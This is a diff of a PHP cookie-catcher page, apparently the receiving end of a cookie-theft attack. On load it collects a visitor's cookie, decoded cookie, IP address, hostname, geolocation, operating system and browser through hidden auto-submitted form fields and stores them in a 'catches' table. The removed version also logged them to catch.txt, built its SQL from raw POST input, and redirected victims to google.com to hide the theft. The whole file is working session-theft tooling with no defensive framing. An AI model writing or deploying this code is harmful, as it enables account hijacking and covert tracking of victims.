@@ -1,137 +1,56 @@
 <?php
-	if(!empty($_SERVER["HTTP_CLIENT_IP"])){
-		$ip_address = $_SERVER["HTTP_CLIENT_IP"];
-	} else if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
-		$ip_address = $_SERVER["HTTP_X_FORWARDED_FOR"];
-	} else {
-		$ip_address = $_SERVER["REMOTE_ADDR"];
+	require_once("Core/init.php");
+
+	$Database = new Database();
+
+	$IPAddress = Client::GetIP();
+	$IPAddress = ($IPAddress === "127.0.0.1" || $IPAddress === "localhost") ? "34.223.124.221" : $IPAddress;
+
+	$UserAgent = Client::GetUserAgent();
+	$LocalHostName = gethostname();
+	$HostName = gethostbyaddr($IPAddress);
+	$Location = Client::GetLocation($IPAddress);
+
+	$OS = Client::GetOS($UserAgent);
+	$Browser = Client::GetBrowser($UserAgent);
+
+	if(Input::Exists()) {
+		$Data = array(
+			"id" => Hash::Make(),
+			"cookie" => (Input::Get("cookie-value") !== null && !empty(Input::Get("cookie-value"))) ? Input::Get("cookie-value") : "No cookie set",
+			"decoded_cookie" => (Input::Get("decoded-cookie") !== null && !empty(Input::Get("decoded-cookie"))) ? Input::Get("decoded-cookie") : "Nothing to decode",
+			"ip_address" => Input::Get("ip-address"),
+			"user_agent" => Input::Get("user-agent"),
+			"local_hostname" => Input::Get("local-hostname"),
+			"hostname" => Input::Get("hostname"),
+			"location" => Input::Get("location"),
+			"client_os" => Input::Get("client-os"),
+			"client_browser" => Input::Get("client-browser"),
+			"catch_date" => StringFormatter::GetDateTime()
+		);
+
+		$Database::Insert("catches", $Data);
 	}
-
-	$user_agent = $_SERVER["HTTP_USER_AGENT"];
-	$hostname = getHostByName(getHostName());
-	
-	function getOS(){
-		global $user_agent;
-		$os_platform = "Unknown OS Platform";
-		$os_array = array(
-			'/windows nt 10/i'      =>  'Windows 10',
-			'/windows nt 6.3/i'     =>  'Windows 8.1',
-			'/windows nt 6.2/i'     =>  'Windows 8',
-			'/windows nt 6.1/i'     =>  'Windows 7',
-			'/windows nt 6.0/i'     =>  'Windows Vista',
-			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
-			'/windows nt 5.1/i'     =>  'Windows XP',
-			'/windows xp/i'         =>  'Windows XP',
-			'/windows nt 5.0/i'     =>  'Windows 2000',
-			'/windows me/i'         =>  'Windows ME',
-			'/win98/i'              =>  'Windows 98',
-			'/win95/i'              =>  'Windows 95',
-			'/win16/i'              =>  'Windows 3.11',
-			'/macintosh|mac os x/i' =>  'Mac OS X',
-			'/mac_powerpc/i'        =>  'Mac OS 9',
-			'/linux/i'              =>  'Linux',
-			'/ubuntu/i'             =>  'Ubuntu',
-			'/iphone/i'             =>  'iPhone',
-			'/ipod/i'               =>  'iPod',
-			'/ipad/i'               =>  'iPad',
-			'/android/i'            =>  'Android',
-			'/blackberry/i'         =>  'BlackBerry',
-			'/webos/i'              =>  'Mobile');
-
-		foreach ($os_array as $regex => $value) {
-			if (preg_match($regex, $user_agent)) {
-				$os_platform = $value;
-				return $os_platform;
-                        } else {
-                                $os_platform = "Unknown Platform";
-                                return $os_platform;
-                        }
-                }
-	}
-
-	function getBrowser() {
-		global $user_agent;
-		$browser = "Unknown Browser";
-		$browser_array = array(
-			'/msie/i'      => 'Internet Explorer',
-			'/firefox/i'   => 'Firefox',
-			'/safari/i'    => 'Safari',
-			'/chrome/i'    => 'Chrome',
-			'/edge/i'      => 'Edge',
-			'/opera/i'     => 'Opera',
-			'/netscape/i'  => 'Netscape',
-			'/maxthon/i'   => 'Maxthon',
-			'/konqueror/i' => 'Konqueror',
-			'/mobile/i'    => 'Handheld Browser');
-			
-		foreach ($browser_array as $regex => $value) {
-			if (preg_match($regex, $user_agent)) {
-				$browser = $value;
-				return $browser;
-                        } else {
-                                $browser = "Unknown Browser";
-                                return $browser;
-                        }
-                }
-	}
-
-	$user_os = getOS();
-	$user_browser = getBrowser();
-	$device_details = "$user_browser, $user_os";
-	$date = date("Y-m-d H:i:s");
 ?>
 <!DOCTYPE html>
 <head>
 	<title></title>
-	<script src="js/getCookie.js"></script>
+	<script src="JavaScript/Generic.js"></script>
 </head>
-<body onload="getCookie();">
-	<?php
-		require("db/db.php");
+<body onload="GetCookie();">
+	<form id="catch-form" id="catch-form" method="post" action="">
+		<input type="text" name="cookie-value" id="cookie-value" hidden />
+		<input type="text" name="decoded-cookie" id="decoded-cookie" hidden />
 
-		if(isset($_POST['cookieval'])){
-			$cookie = $_POST["cookieval"];
-			$dc = $_POST["decodedcookie"];
-
-			$file = fopen('catch.txt', 'a');
-			fwrite($file,
-			       "Cookie: ".$cookie
-			       ."\nDecoded Cookie: ".$dc
-			       ."\nExternal IP Address: ".$ip_address
-			       ."\nLocal IP/Webhost: ".$hostname
-			       ."\nDevice Details: ".$device_details
-			       ."\nCatch Date: ".$date
-			       ."\n\n"
-			);
-
-			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");
-
-			echo "<script>window.location.replace('https://www.google.com/');</script>";
-		} else {
-			$cookie = "Failed to collect cookie";
-			$dc = "Nothing to decode";
-
-			$file = fopen("catch.txt", "a");
-			fwrite($file,
-			       "Cookie: ".$cookie
-			       ."\nDecoded Cookie: ".$dc
-			       ."\nExternal IP Address: ".$ip_address
-			       ."\nLocal IP/Webhost: ".$hostname
-			       ."\nDevice Details: ".$device_details
-			       ."\nCatch Date: ".$date
-			       ."\n\n"
-			);
-
-			$db->exec("INSERT INTO catches(cookie, decoded_cookie, ip_address, hostname, device_details, catch_date) VALUES ('$cookie', '$dc', '$ip_address', '$hostname', '$device_details', '$date')");
-
-			echo "<script>window.location.replace('https://www.google.com/');</script>";
-		}
-	?>
-
-	<form id="catchForm"  method="POST" action="" >
-		<input type="text" name="cookieval" id="cookieval" hidden />
-		<input type="text" name="decodedcookie" id="decodedcookie" hidden />
+		<input type="text" name="ip-address" id="ip-address" value="<?php echo ($IPAddress !== null) ? $IPAddress : "Unknown IP Address"; ?>" hidden />
+		<input type="text" name="user-agent" id="user-agent" value="<?php echo ($UserAgent !== null) ? $UserAgent : "Unknown User Agent"; ?>" hidden />
+		<input type="text" name="local-hostname" id="local-hostname" value="<?php echo ($LocalHostName !== false) ? $LocalHostName : "Unknown Local Hostname"; ?>" hidden />
+		<input type="text" name="hostname" id="hostname" value="<?php echo ($HostName !== false) ? $HostName : "Unknown Host Name"; ?>" hidden />
+		<input type="text" name="location" id="location" value="<?php echo ($Location !== null) ? $Location['full_location'] : "Unknown Location"; ?>" hidden />
+		<input type="text" name="client-os" id="client-os" value="<?php echo ($OS !== null) ? $OS : "Unknown OS"; ?>" hidden />
+		<input type="text" name="client-browser" id="client-browser" value="<?php echo ($Browser !== null) ? $Browser : "Unknown Browser"; ?>" hidden />
 	</form>
-	<button form="catchForm" name="submitForm" id="submitForm" style="display:none;"></button>
+
+	<button form="catch-form" name="submit" id="submit" style="display:none;"></button>
 </body>
 </html>
